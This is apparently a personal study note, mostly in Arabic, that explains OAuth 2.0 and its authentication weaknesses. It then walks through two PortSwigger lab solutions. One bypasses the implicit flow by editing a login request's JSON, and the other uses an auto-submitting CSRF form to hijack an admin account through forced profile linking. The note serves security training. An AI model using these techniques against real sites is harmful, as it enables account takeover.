# OAauth 

* <details>
     <summary>What is OAuth and how it work?</summary>

  # 🚀 شرح OAuth 2.0 ببساطة
  
  ## ما هو OAuth؟
  - **OAuth** عبارة عن **إطار عمل (Framework) للتفويض Authorization**.  
  - فكرته الأساسية:  
    التطبيق (مثلاً موقع ألعاب) ممكن يطلب صلاحيات محدودة من حسابك في خدمة تانية (زي Google أو Facebook) **من غير ما يعرف الباسورد بتاعك**.  
  - ده بيدي للمستخدم تحكم: يقدر يوافق يشارك بيانات معينة (زي قائمة أصدقائه) من غير ما يدي صلاحيات كاملة أو يسلّم حسابه بالكامل.  
  
  📌 **مثال**: تطبيق عايز يعمل "Find Friends" → يطلب منك صلاحية الدخول على الـ contacts في Gmail.  
  
  ---
  
  ## الفايدة الأكبر
  - بدل ما المستخدم يدخل الباسورد بتاعه في مواقع كتير → يدخل مرة واحدة في Google/Facebook.  
  - الموقع التاني ياخد **Access Token** يقدر يستخدمه عشان يجيب البيانات المسموح بيها فقط.  
  
  ---
  
  ## 👥 أطراف اللعبة في OAuth 2.0
  1. **Client Application**: الموقع اللي عايز يستخدم بياناتك (مثلاً موقع يشغّل خدمة).  
  2. **Resource Owner**: المستخدم نفسه (إنت).  
  3. **OAuth Service Provider**: الجهة اللي عندها بياناتك (مثلاً Google, Facebook).  
     - فيها **Authorization Server** (اللي بيأكّد الهوية ويطلع Access Token).  
     - وفيها **Resource Server** (اللي فيه الـ API والبيانات).  
  
  ---
  
  ## 🔄 خطوات العملية (Simplified Flow)
  1. **Client App** يطلب منك تصريح: "ممكن أخد صلاحية X من حسابك؟".  
  2. أنت بتروح على صفحة Google/Facebook، تعمل Login وتوافق على الطلب.  
  3. لو وافقت: السيرفر (Google) يدي التطبيق **Authorization Code** (أو Access Token على طول حسب نوع الـ Flow).  
  4. التطبيق يستخدم الكود عشان ياخد **Access Token** من الـ Authorization Server.  
  5. التطبيق يستخدم الـ Token ده عشان يكلم الـ Resource Server ويجيب البيانات اللي إنت وافقت عليها.  
  
  ---
  
  ## 📚 أنواع الـ Flows (Grant Types)
  - **Authorization Code Flow** (الأكثر شيوعًا – آمن):  
    - التطبيق ياخد **Code** مؤقت → يبدّله بـ **Access Token** من السيرفر.  
    - ميزة: التوكين مش بيعدي عبر الـ URL مباشرة (أأمن).  
  
  - **Implicit Flow** (قديم – أقل أمان):  
    - التطبيق بياخد **Access Token** مباشرة في الـ URL.  
    - مشاكل: ممكن يتسرب في الـ logs أو الـ referrer.  
  
  ---
  
  ## 📝 الخلاصة
  - OAuth مش نظام Authentication (هو أساسًا **Authorization**).  
  - لكنه بيستخدم بشكل واسع في **Social Login** (تسجيل الدخول بجوجل/فيسبوك).  
  - بيوفر **أمان + سهولة**: المستخدم ما يشاركش كلمة السر، والتطبيق ياخد صلاحيات محدودة.  
  - أهم شيء: نفهم الـ Flows (Authorization Code / Implicit) قبل ما ندخل في ثغراته.  
  
  
  
  
  ---
  ---
  
  # 🔑 OAuth كـ Authentication (تسجيل دخول)
  
  ## ما الفرق عن OAuth الأصلي؟
  - **الفكرة الأصلية لـ OAuth**: كان معمول علشان *التفويض* (Authorization) → يعني السماح لتطبيق معيّن ياخد صلاحيات محدودة من حسابك.  
  - **لكن مع الوقت**: بدأوا يستخدموه كمان في *المصادقة* (Authentication) → تسجيل الدخول بحساب خارجي زي Google أو Facebook.  
  
  📌 يعني بدل ما تسجّل في الموقع وتعمل Username/Password جديدة، تختار "Login with Google".  
  
  ---
  
  ## ⚙️ إزاي بيشتغل كـ Authentication؟
  الـ Flow الأساسي شبه الـ OAuth العادي، لكن الفرق في **إزاي الـ Client App بيستعمل البيانات**:  
  
  1. **المستخدم** يختار "تسجيل الدخول باستخدام حساب فيسبوك/جوجل".  
  2. **Client App** يطلب من خدمة OAuth (مثلاً Google) بيانات تعريفية عن المستخدم (زي الـ email).  
  3. بعد ما السيرفر يدي **Access Token** → الـ Client App يستخدمه ويطلب بيانات المستخدم من الـ **Resource Server** (عادة من endpoint زي `/userinfo`).  
  4. السيرفر يبعت البيانات (مثلاً: email = user@gmail.com).  
  5. الـ Client App يستخدم البيانات دي بدال الـ Username/Password علشان يعرّفك في السيستم.  
     - أحيانًا الـ Access Token نفسه بيتعامل كأنه "بديل للباسورد" طول ما هو صالح.  
  
  ---
  
  ## 👀 من منظور المستخدم
  - الشكل النهائي بيشبه **SSO (Single Sign-On)** اللي معمول بـ SAML.  
  - المستخدم بيضغط زر واحد → يفتح صفحة خارجية (Google) → يوافق → يرجع للموقع وهو متسجّل دخول.  
  
  ---
  
  ## 🧪 التدريب العملي (Lab Example)
  - لما تعمل Login بالـ Social Media في الـ Lab على PortSwigger، هتشوف:  
    - **Redirects** رايحة وجاية بين الموقع وبين السيرفر (Google/Facebook).  
    - **Access Token** بيطلع من السيرفر.  
    - الموقع بيطلب `/userinfo` عشان يجيب بياناتك.  
  
  > في المعمل، تقدر تجرب تعمل Login بحساب الاختبار: **wiener:peter** وتشوف كل الـ Flow ده في Burp Proxy.  
  
  ---
  
  ## 📝 الخلاصة
  - OAuth اتطور وبقى وسيلة تسجيل دخول (Authentication) مش بس تفويض.  
  - الـ Client App مش بياخد الباسورد بتاعك → بياخد Access Token → وبيروح يجيب بيانات من السيرفر (زي الـ email) → ويدخلك بيها.  
  - النتيجة: Login سهل وسريع + أمان أعلى (ما فيش مشاركة للباسورد).  
  - لكن 👀 هنا ييجي دور الثغرات اللي ممكن تحصل أثناء العملية (هنشوفها في الـ Labs).  
  
  
  

  </details>







- <details>
     <summary>How do OAuth authentication vulnerabilities arise?</summary>
     
     # ⚠️ كيف تنشأ ثغرات OAuth Authentication؟
     
     ## 💡 أسباب ظهور الثغرات
     1. **مرونة الـ OAuth Spec**  
        - البروتوكول مش صارم وبيعتمد على إعدادات اختيارية كتير.  
        - ده بيخلي فيه مساحة لسوء إعداد (Misconfiguration).  
     
     2. **قلة وجود خصائص أمان مدمجة**  
        - الأمان بيعتمد على الـ Developers يطبقوا الإجراءات الصح (زي input validation).  
        - لو حصل إهمال → يؤدي إلى ثغرات خطيرة.  
     
     3. **إرسال بيانات حساسة عبر المتصفح**  
        - بعض الـ Flows (زي Authorization Code أو Implicit) بيعدي فيها بيانات حساسة (Access Token) من خلال المتصفح.  
        - ده ممكن يستغله المهاجم لاعتراض البيانات.  
     
     ---
     
     ## 🔍 التعرف على OAuth Authentication
     - أي موقع فيه زر **"Login with Google/Facebook/GitHub"** → غالبًا بيستخدم OAuth 2.0.  
     
     ### الطريقة الأكيدة عبر Burp:
     - شغّل Burp Proxy واعمل تسجيل دخول باستخدام Social Login.  
     - أول طلب في الـ Flow بيكون رايح على:  
     
     ```
     /authorization
     ```
     
     - وبيحتوي على باراميترات مميزة لـ OAuth:  
       - `client_id` → رقم تعريف التطبيق.  
       - `redirect_uri` → الرابط اللي هيتم التحويل عليه بعد الموافقة.  
       - `response_type` → نوع الـ Grant (token / code).  
       - `scope` → البيانات المطلوبة (مثلاً: profile, email).  
       - `state` → قيمة عشوائية لمنع CSRF.  
     
     ---
     
     ## 📌 مثال Request
     ```http
     GET /authorization?client_id=12345&redirect_uri=https://client-app.com/callback&response_type=token&scope=openid%20profile&state=ae13d489bd00e3c24 HTTP/1.1
     Host: oauth-authorization-server.com
     ```
     
     ---
     
     ## 📝 الخلاصة
     - **سبب الثغرات:** مرونة البروتوكول + سوء الإعداد + مرور بيانات حساسة عبر المتصفح.  
     - **إزاي نكشفه:** نحلل الـ Requests في Burp ونشوف باراميترات OAuth (`client_id`, `redirect_uri`, `response_type`, إلخ).  
     
          
</details>


























# OAuth authentication Labs 




<details>
  <summary>Lab: Authentication bypass via OAuth implicit flow</summary>

1. login with **`wiener : peter`**
2. go to ``http history`` in burp

```
POST /authenticate HTTP/2
Host: 0a4d00a404a21971801a6239001b004c.web-security-academy.net
Cookie: session=ysuWtiBhdYmkXnGRsG3NrvyppQVIhu0w
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a4d00a404a21971801a6239001b004c.web-security-academy.net/oauth-callback
Content-Type: application/json
Content-Length: 103
Origin: https://0a4d00a404a21971801a6239001b004c.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=4
Te: trailers


{
  "email":"wiener@hotdog.com",
  "username":"wiener",
  "token":"z_FeEMGkJ9NtWwvU9zrSwhScgQdn47ZzEf8GpgcEB3r"
}
```
   
`change jsaon content to:`

```
{
  "email":"carlos@carlos-montoya.net",
  "username":"carlos",
  "token":"z_FeEMGkJ9NtWwvU9zrSwhScgQdn47ZzEf8GpgcEB3r"
}
```

> after that click **`show response in browser`**

<img width="752" height="51" alt="image" src="https://github.com/user-attachments/assets/7f8e2109-d3c0-46bb-9ca6-d77a8a8b9578" />

<img width="1390" height="536" alt="image" src="https://github.com/user-attachments/assets/9a8e8ece-b078-4b45-8b0e-a0b1413996c2" />


 
</details>






<details>
     <summary>Lab: Forced OAuth profile linking</summary>

> ## **`To solve the lab, use a CSRF attack to attach your own social media profile to the admin user's account on the blog website, then access the admin panel and delete carlos. `**
>
>  The admin user will open anything you send from the exploit server and they always have an active session on the blog website.

> You can log in to your own accounts using the following credentials:

-  Blog website account:`` wiener:peter``
-  Social media profile:`` peter.wiener:hotdog``


----

1. login with ``wiener:peter``

<img width="1273" height="537" alt="image" src="https://github.com/user-attachments/assets/ff27a0db-4598-4647-b7ba-a28c62d40fb9" />

2. click **``Attach a social profile``**

<img width="907" height="437" alt="image" src="https://github.com/user-attachments/assets/80696210-7ea5-4def-9f15-518fd442c4aa" />

3. now click on **``Attach a social profile``** again and see the request 

```http
GET /oauth-linking?code=YY52NQhSrmG4yvxAM5UPtPhrwgBimnWuPsBRXnNmo0x HTTP/2
Host: 0af400fc034fa721828c2e1b008a00fe.web-security-academy.net
Cookie: session=zhztY0fc04nIrQw0u2jRWNHd4UdZ6hl7
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0af400fc034fa721828c2e1b008a00fe.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
```

4. after that do **`CSRF poc`**


```html
<html>
<body>
  <form action="https://0af400fc034fa721828c2e1b008a00fe.web-security-academy.net/oauth-linking" method="GET">
    <input type="hidden" name="code" value="YY52NQhSrmG4yvxAM5UPtPhrwgBimnWuPsBRXnNmo0x" />
    <input type="submit" value="Submit request" />
  </form>
  <script>
    document.forms[0].submit();
  </script>
</body>
</html>
```
   
5. store it and send it to victem 

<img width="1248" height="399" alt="image" src="https://github.com/user-attachments/assets/9f87e559-8142-48b3-aed0-9c5bc5904b3d" />

6. after that go back to ****`my-account`**** you will find that usernme disappeared


<img width="1237" height="551" alt="image" src="https://github.com/user-attachments/assets/161ee210-ee49-43bd-b910-e2f726be7c61" />

7. now logout and login again but with socialmedia profile **`peter.wiener:hotdog`**

<img width="1460" height="464" alt="image" src="https://github.com/user-attachments/assets/fc767282-bf95-4610-b139-a0d0cada186b" />

<img width="1422" height="450" alt="image" src="https://github.com/user-attachments/assets/b65ab03a-f146-42c5-b836-36b498f27959" />


```
الثغرة حصلت لأن الموقع سمح بربط OAuth profile من غير أي تحقق إضافي.
فالمهاجم قدر يبعث CSRF للضحية، وبكده يرغم حساب الضحية إنه يرتبط بحساب OAuth بتاع المهاجم.
النتيجة: المهاجم يقدر يدخل بحساب الضحية باستخدام OAuth login → account hijacking كامل.
```

     
</details>







































 
